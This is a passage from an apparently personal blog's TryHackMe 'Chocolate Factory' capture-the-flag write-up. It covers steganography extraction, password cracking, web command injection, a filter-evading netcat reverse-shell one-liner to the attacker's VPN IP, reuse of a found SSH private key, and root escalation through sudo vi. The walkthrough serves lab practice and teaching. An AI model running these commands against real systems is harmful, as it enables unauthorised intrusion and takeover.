+<p>With no password we can extract <strong>b64.txt</strong>.</p>
+<p>Hence</p>
+<blockquote>
+<p>steghide &ndash;extract -sf gum_room.jpg</p>
+</blockquote>
+<p><img src="/TryHackMe/ChocolateFactory/stegextract.png" alt=""></p>
+<p>So if we open it is base64 encoded as expected . Let&rsquo;s go to <a href="https://gchq.github.io/CyberChef/">CyberChef</a>.</p>
+<p><img src="/TryHackMe/ChocolateFactory/cyberchef.png" alt=""></p>
+<p>Hence I used john to crack it took around 10 minutes(approx).</p>
+<p>Since we have the password for user charlie , I initially thought it must be ftp password (yes I know it is not ssh because wont it be obvious?). But no It was not ftp password.</p>
+<p>Hence I visited <strong>port 80</strong></p>
+<p><img src="/TryHackMe/ChocolateFactory/port80.png" alt=""></p>
+<p>So I used the password we found and it worked.</p>
+<p>After we login we can see .</p>
+<p><img src="/TryHackMe/ChocolateFactory/homephp.png" alt=""></p>
+<p>So we can execute commands !.</p>
+<p>Hence I tried &ldquo;ls&rdquo; and I saw something <strong>interesting</strong>.</p>
+<p><img src="/TryHackMe/ChocolateFactory/keyroom.png" alt=""></p>
+<p>Hence this is the key asked in the first question .</p>
+<p>We download it by going to</p>
+<blockquote>
+<p>http://&lt;machineip&gt;/key_rev_key</p>
+</blockquote>
+<p>Let&rsquo;s keep the key it might be useful in later stage.</p>
+<h2 id="__second-stage--initial-access-as-www-data__"><strong>Second Stage : Initial Access as www-data</strong></h2>
+<p>Hence we have command injection let&rsquo;s try reverse shell.</p>
+<p>But definitely there would be filters hence I used this technique:</p>
+<blockquote>
+<p>r&quot;m&quot; /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;vpn ip&gt; 4444 &gt;/tmp/f</p>
+</blockquote>
+<p><img src="/TryHackMe/ChocolateFactory/wwwdata.png" alt=""></p>
+<h2 id="__third-stage--www-data-to-charlie__"><strong>Third Stage : www-data to charlie</strong></h2>
+<p>Hence I enumerated manually without using <strong>linpeas</strong>.</p>
+<p>I went to charlie&rsquo;s home directory . I found something <strong>interesting.</strong></p>
+<p><img src="/TryHackMe/ChocolateFactory/foundprivate.png" alt=""></p>
+<p>Hence they are private and public keys of <strong>charlie</strong>(i guess so ).</p>
+<p>Hence I copied and used it .</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">chmod <span style="color:#ff0;font-weight:bold">600</span> teleport
+ssh -i teleport charlie@&lt;machine-ip&gt;
+</code></pre></div><h2 id="__fourth-stage--charlie-to-root__"><strong>Fourth Stage : charlie to root</strong></h2>
+<p>As always I try</p>
+<blockquote>
+<p>sudo -l</p>
+</blockquote>
+<p><img src="/TryHackMe/ChocolateFactory/perms.png" alt=""></p>
+<p>Hence  I went to <strong><a href="https://gtfobins.github.io/">GTFOBins</a></strong> and searched for <strong>vi</strong>.</p>
+<p>So steps to exploit is :</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">sudo /usr/bin/vi
+:set shell=/bin/sh
+:shell
+</code></pre></div><p><img src="/TryHackMe/ChocolateFactory/whoami.png" alt=""></p>
+<p>So we go to <strong>/root</strong> directory .</p>
+<p><img src="/TryHackMe/ChocolateFactory/rootpy.png" alt=""></p>
+<p>So the flag is in the form of python file.</p>
+<p>Let&rsquo;s see whats in it.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#fff;font-weight:bold">from</span> cryptography.fernet <span style="color:#fff;font-weight:bold">import</span> Fernet
+<span style="color:#fff;font-weight:bold">import</span> pyfiglet
+key=<span style="color:#fff;font-weight:bold">input</span>(<span style="color:#0ff;font-weight:bold">&#34;Enter the key:  &#34;</span>)
+f=Fernet(key)
+encrypted_mess= <span style="color:#0ff;font-weight:bold">&#39;&lt;redacted-msg&gt;&#39;</span>
+dcrypt_mess=f.decrypt(encrypted_mess)
+mess=dcrypt_mess.decode()
+display1=pyfiglet.figlet_format(<span style="color:#0ff;font-weight:bold">&#34;You Are Now The Owner Of &#34;</span>)
+display2=pyfiglet.figlet_format(<span style="color:#0ff;font-weight:bold">&#34;Chocolate Factory &#34;</span>)
+<span style="color:#fff;font-weight:bold">print</span>(display1)
+<span style="color:#fff;font-weight:bold">print</span>(display2)
+<span style="color:#fff;font-weight:bold">print</span>(mess)
+</code></pre></div><p>Hence the flag can be obtained if we provide the key we got during enumeration.</p>
+<p>Let&rsquo;s run it.</p>
+<blockquote>
+<h3 id="note--enter-the-key-between-key-">note : enter the key between &ldquo;&lt;key&gt; &quot;</h3>
+</blockquote>
+<p><img src="/TryHackMe/ChocolateFactory/rootflag.png" alt=""></p>
+
+      </div>
+
+
+      <footer>
+        
+
+<section class="see-also">
+  
+    
+    
+    
+      <h3>See also in TryHackMe</h3>
+      <nav>
+        <ul>
+        
+        
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/tryhackme/battery/">Battery TryHackMe Writeup</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/tryhackme/overpass3/">Overpass3 TryHackMe Writeup</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/tryhackme/chill_hack/">Chill Hack TryHackMe Writeup</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/tryhackme/unbaked_pie/">Unbaked Pie TryHackMe Writeup</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/tryhackme/all_in_one/">All in One TryHackMe Writeup</a>
+            </li>
+          
+        
+        </ul>
+      </nav>
+    
+  
+</section>
+
+
+        <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "yourdiscussshortname" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+      </div>
+
+      
+  <footer class="footer">
+    <section class="container">
+      
+        <p>Hack The Planet!</p>
+      
+      
+        ©
+        
+          2019 -
+        
+        2021
+         d4rkn1gh7 | Balaji Anandhan 
+      
+      
+      
+        
+      
+    </section>
+  </footer>
+
+
+    </main>
+
+    
+      
+        
+        <script src="/js/dark-mode.min.0213e1773e6d1c5a644f847c67a6f8abac49a3776e2976f6008038af8c5b76a1.js"></script>
+      
+    
+
+    
+
+    
+
+    <script>
+(function(f, a, t, h, o, m){
+	a[h]=a[h]||function(){
+		(a[h].q=a[h].q||[]).push(arguments)
+	};
+	o=f.createElement('script'),
+	m=f.getElementsByTagName('script')[0];
+	o.async=1; o.src=t; o.id='fathom-script';
+	m.parentNode.insertBefore(o,m)
+})(document, window, '//analytics.example.com/tracker.js', 'fathom');
+fathom('set', 'siteId', 'ABCDE');
+fathom('trackPageview');
+</script>
+
+
+    <script async defer data-domain="example.com" src="https://analytics.example.com/js/plausible.js"></script>
+
+
+    <script data-goatcounter="https://code.goatcounter.com/count"
+        async src="//gc.zgo.at/count.js"></script>
+
+
+    
+<script defer src='https://static.cloudflareinsights.com/beacon.min.js'
+        data-cf-beacon='{"token": "token"}'></script>
+
+
+  </body>
+
+</html>
